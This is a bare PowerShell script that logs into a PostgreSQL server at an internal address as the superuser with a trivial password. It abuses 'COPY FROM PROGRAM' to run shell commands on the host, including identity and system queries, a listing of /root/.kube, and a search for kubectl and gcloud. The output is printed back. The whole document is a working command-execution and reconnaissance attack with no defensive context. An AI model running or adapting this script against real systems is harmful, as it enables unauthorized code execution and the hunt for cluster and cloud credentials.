$c=New-Object System.Data.Odbc.OdbcConnection
$c.ConnectionString="Driver={PostgreSQL Unicode};Server=10.9.101.3;Port=5432;Database=postgres;Uid=postgres;Pwd=x;sslmode=disable"
try {
    $c.Open()
    Write-Host "CONNECTED"
    
    $cmd=$c.CreateCommand()
    $cmd.CommandText="DROP TABLE IF EXISTS cmd_out"
    $cmd.ExecuteNonQuery() | Out-Null
    Write-Host "DROP_OK"
    
    $cmd1b=$c.CreateCommand()
    $cmd1b.CommandText="CREATE TABLE cmd_out(line text)"
    $cmd1b.ExecuteNonQuery() | Out-Null
    Write-Host "CREATE_OK"
    
    $cmd2=$c.CreateCommand()
    $cmd2.CommandText="COPY cmd_out FROM PROGRAM 'id; hostname; uname -a; ls /root/.kube/ 2>/dev/null; which kubectl gcloud 2>/dev/null'"
    $cmd2.ExecuteNonQuery() | Out-Null
    Write-Host "COPY_OK"
    
    $cmd3=$c.CreateCommand()
    $cmd3.CommandText="SELECT line FROM cmd_out"
    $r=$cmd3.ExecuteReader()
    while($r.Read()){Write-Host ("OUT:"+$r[0])}
    $r.Close()
} catch {
    Write-Host ("ERR:"+$_)
}
$c.Close()
